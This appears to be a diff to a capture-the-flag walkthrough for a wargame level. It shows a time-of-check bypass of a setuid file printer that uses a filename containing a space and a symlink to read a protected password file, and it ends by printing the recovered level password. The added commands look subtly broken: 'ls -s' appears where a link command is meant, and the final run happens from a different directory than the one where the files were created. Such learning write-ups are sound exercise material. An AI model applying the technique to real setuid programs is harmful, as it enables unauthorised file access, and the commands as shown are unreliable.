@@ -22,14 +22,23 @@ ls -la
 ltrace ./printfile .bash_logout
 ltrace ./printfile /etc/leviathan_pass/leviathan3
 
-//comparing the function calls, you'll see that for .bash_logout the access function is called and passed then a call to /bin/cat is called and prints
-//for /etc/leviathan_pass/leviathan3 you'll see that access function catches the lack of permisions and program is exited
+//comparing the function calls, for .bash_logout the access function is called and passed then in another function /bin/cat is called and prints
+//for /etc/leviathan_pass/leviathan3 access function catches the lack of permisions and program is exited
 //think of a way to bypass the access function since this is the only that checks you have permissions over the file passed for print
 
 //read somewhere to test how the executable behaves for inputs separated by spaces
 //after testing realized that the access function checks for permissions of the file by it's full space separated name
 //but the printing function only takes the first part of the file name before the space
-
-
+//so I tought having the printfile executable check the access of a file named "test file" while actually printing the contents of "test" file
+//but first I needed a way for this test file that is going to be printed to be actually /etc/leviathan_pass/leviathan3
+//so creating a soft link is necessary
+cd /tmp
+mkdir escalation
+cd escalation
+touch "test file"
+ls -s /etc/leviathan_pass/leviathan3 test
+chmod 777 .
+cd ~
+./printfile "test file"
 
 leviathan3 user password: Q0G8j4sakn 
